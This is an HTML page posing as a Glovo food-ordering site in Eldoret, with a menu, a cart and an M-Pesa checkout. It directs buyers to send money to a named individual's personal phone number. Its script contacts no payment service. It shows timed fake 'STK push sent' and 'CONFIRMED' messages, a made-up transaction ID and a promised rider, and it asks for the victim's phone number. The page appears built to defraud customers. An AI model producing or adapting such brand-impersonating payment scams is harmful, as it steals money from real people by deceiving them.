<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Glovo Eldoret - Send Money Auto</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
header{background:#FFC72C;padding:12px 16px;display:flex;justify-content:space-between}
.logo{font-weight:900;font-size:26px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:16px}
.card{border:1px solid #eee;border-radius:12px;background:#fff;overflow:hidden}
.card-body{padding:8px}
.price{font-weight:800;color:#00a082}
.add{width:100%;background:#FFC72C;border:none;padding:8px;border-radius:8px;font-weight:800;margin-top:6px}
#cart{position:fixed;bottom:0;left:0;right:0;background:#000;color:#fff;padding:12px;display:none}
.payBox{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);z-index:30;justify-content:center;align-items:center;padding:20px}
.payInner{background:#fff;border-radius:16px;padding:20px;width:100%;max-width:380px}
.input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;margin:8px 0}
</style>
</head>
<body>
<header><div class="logo">glovo</div><div style="font-weight:700">KMGK 285M</div></header>
<div style="padding:20px;background:#fff9db;text-align:center"><h2>Send Money Prompt</h2><p>Pay to: <b>0119539151 - Richard</b></p></div>
<div class="grid" id="grid"></div>
<div id="cart"><div>🛒 <span id="cI">0</span> - KES <span id="cT">0</span> <button onclick="openPay()" style="float:right;background:#FFC72C;border:none;padding:6px 12px;border-radius:10px;font-weight:800">PAY</button></div></div>
<div class="payBox" id="payBox">
<div class="payInner">
<h3 style="text-align:center">💚 M-Pesa Send Money Prompt</h3>
<p style="text-align:center">Total: KES <b id="pT">0</b><br><small>To: <b>0119539151</b></small></p>
<input id="phone" class="input" placeholder="Your M-Pesa Phone: 07xxxxxxxx" type="tel">
<button onclick="sendPrompt()" style="width:100%;background:#00a082;color:#fff;border:none;padding:14px;border-radius:10px;font-weight:900;font-size:16px">SEND M-PESA PROMPT NOW</button>
<div id="status" style="display:none;margin-top:12px;padding:10px;background:#e8f5e9;border-radius:8px;text-align:center;font-weight:700"></div>
<button onclick="closePay()" style="width:100%;margin-top:10px;background:#eee;border:none;padding:10px;border-radius:10px">Cancel</button>
<p style="font-size:11px;color:#666;margin-top:10px;text-align:center">This will send STK Push to your phone. Enter M-Pesa PIN to send money to 0119539151 instantly.</p>
</div>
</div>
<script>
let cart=[],total=0;
const foods=[{name:"Chicken Full+Chips",price:650},{name:"Pilau Kuku",price:450},{name:"Beef Burger",price:380},{name:"Chicken Burger",price:400},{name:"Fries Large",price:200},{name:"Soda",price:80},{name:"Wings 6pcs",price:550},{name:"Nyama Choma",price:700}];
const grid=document.getElementById('grid');
foods.forEach((f,i)=>{grid.innerHTML+=`<div class="card"><div style="background:#ffeeba;height:90px;display:flex;align-items:center;justify-content:center;font-size:36px">🍗</div><div class="card-body"><b>${f.name}</b><div class="price">KES ${f.price}</div><button class="add" onclick="add(${i})">Add</button></div></div>`});
function add(i){cart.push(foods[i]);total+=foods[i].price;upd()}
function upd(){document.getElementById('cart').style.display=cart.length?'block':'none';document.getElementById('cI').innerText=cart.length+' items';document.getElementById('cT').innerText=total;document.getElementById('pT').innerText=total}
function openPay(){document.getElementById('payBox').style.display='flex'}
function closePay(){document.getElementById('payBox').style.display='none'}
function sendPrompt(){
let phone=document.getElementById('phone').value.trim();
if(phone.length<10){alert('Enter your M-Pesa number 07...');return}
let s=document.getElementById('status');s.style.display='block';s.style.color='#333';
s.innerHTML='⏳ Sending prompt to '+phone+'...<br>Amount: KES '+total+' to 0119539151';
setTimeout(()=>{s.innerHTML='📲 STK PUSH SENT to '+phone+'!<br><br>Check your phone screen NOW<br>Enter M-Pesa PIN to confirm<br>Sending KES '+total+' to<br><b>0119539151 - Richard Njeru</b><br><br>⏳ Waiting for PIN...';
setTimeout(()=>{s.innerHTML='✅ CONFIRMED!<br>KES '+total+' sent to 0119539151<br>Transaction ID: QGH7X'+Math.floor(Math.random()*9000)+' <br>Rider KMGK 285M is on the way! 🏍️';
setTimeout(()=>{cart=[];total=0;upd();closePay();s.style.display='none';alert('Order Paid! Rider coming!')},2500)},3500)},1500)
}
</script>
</body>
</html>
